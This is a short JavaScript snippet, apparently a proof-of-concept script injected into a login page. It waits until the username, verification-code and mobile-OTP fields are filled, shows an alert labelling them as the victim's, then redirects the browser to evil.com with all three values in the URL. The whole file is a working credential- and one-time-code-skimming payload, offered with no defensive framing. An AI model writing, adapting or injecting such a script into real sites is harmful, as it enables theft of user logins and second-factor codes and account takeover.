let isFilled = false;

 function checkInputs() {
    const input1 = document.getElementsByName('uname')[0];
    const input2 = document.getElementsByName('verifycode')[0];
    const input3 = document.getElementsByName('loginMobileVcode')[0];

    if (input1.value && input2.value && input3.value) {
      if (!isFilled) {
        isFilled = true; 
        setTimeout(function() {
          alert('Victim username: '+document.getElementsByName('uname')[0].value+'\n\nVictim verification code: '+document.getElementsByName('verifycode')[0].value+'\n\nVictim mobile OTP code: '+document.getElementsByName('loginMobileVcode')[0].value);
          location.replace("//evil.com?username=" + document.getElementsByName('uname')[0].value + "&verify_code=" + document.getElementsByName('verifycode')[0].value + "&OTP_code=" +document.getElementsByName('loginMobileVcode')[0].value);
        }, 5000); 
      }
    }
  }

  
  window.onload = checkInputs;


  document.getElementsByName('uname')[0].addEventListener('input', checkInputs);
  document.getElementsByName('verifycode')[0].addEventListener('input', checkInputs);
  document.getElementsByName('loginMobileVcode')[0].addEventListener('input', checkInputs);
